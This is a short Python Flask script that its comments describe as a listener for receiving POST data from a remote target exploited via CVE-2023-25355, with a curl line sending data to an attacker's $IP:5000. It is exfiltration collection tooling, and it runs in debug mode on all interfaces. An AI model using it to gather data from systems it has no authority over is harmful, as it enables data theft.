# Minimal Flask server used to receive POST requests from a remote target
# Used for CVE-2023-25355
#
# pip install Flask
# export FLASK_APP=POST_Server.py
# export FLASK_DEBUG=1
# python -m flask run --host=0.0.0.0
#
# curl -k -X POST -d "Data" http://$IP:5000

from flask import Flask, request

app = Flask(__name__)

@app.route('/', methods=['POST', 'GET'])
def dump():
    print("\n Received data:\n")

    print("\n Request:\n")
    print(request)

    print("\n Raw data:\n")
    print(request.get_data())

    print("\n Stream:\n")
    print(request.stream)
    print(request.stream.read())

    print("\n JSON:\n")
    print(request.json)
    print(request.get_json(force=True))
